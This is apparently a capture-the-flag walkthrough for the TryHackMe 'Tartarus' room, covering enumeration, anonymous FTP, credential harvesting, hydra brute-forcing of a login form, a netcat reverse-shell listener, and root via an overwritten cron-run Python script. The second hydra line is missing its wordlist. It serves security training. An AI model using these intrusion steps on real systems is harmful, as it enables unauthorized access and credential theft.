---
description: https://tryhackme.com/room/tartaraus
---

# Tartarus

### &#x20;**User Flag**

```
nmap 10.10.196.179
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 08-32-16.png>)

#### ftp

```
lftp 10.10.196.179 -u anonymous,
lftp :~> ls -a
lftp :~> cat test.txt
lftp :~> cd ...
lftp :~> ls -a
lftp :~> cd ...
lftp :~> ls -a
lftp :~> cat yougotgoodeyes.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 08-33-46.png>)

#### http

```bash
gobuster dir -u http://10.10.196.179/ \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64 -x txt
gobuster dir -u http://10.10.196.179/sUp3r-s3cr3t \
             -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt \
             -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 09-11-24.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-17 08-50-21.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-17 08-47-21.png>)

```bash
curl http://10.10.196.179/robots.txt
wget http://10.10.196.179/admin-dir/credentials.txt
wget http://10.10.196.179/admin-dir/userid
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 09-12-22.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-17 09-12-27.png>)

```bash
hydra -L userid -p test \
      'http-post-form://10.10.196.179/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect username!' \
      -I -f -V -t64
hydra -l enox -P  \
      'http-post-form://10.10.196.179/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect password!' \
      -I -f -V -t64
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 09-15-30.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-17 09-16-37.png>)

![](<../../.gitbook/assets/Screenshot from 2020-09-17 10-10-40.png>)

```bash
nc -nvlp 4444
$ find / -name user.txt 2>/dev/null
$ cat /home/d4rckh/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 10-11-54.png>)

### **Root Flag**

```bash
$ cat /etc/crontab
$ ls -l /home/d4rckh/cleanup.py
$ echo 'import os; os.system("cat /root/root.txt > /tmp/root.txt")' > /home/d4rckh/cleanup.py
$ cat /tmp/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-17 10-14-14.png>)

## :link: Support Material

{% embed url="https://gtfobins.github.io/gtfobins/gdb/#sudo" %}

****
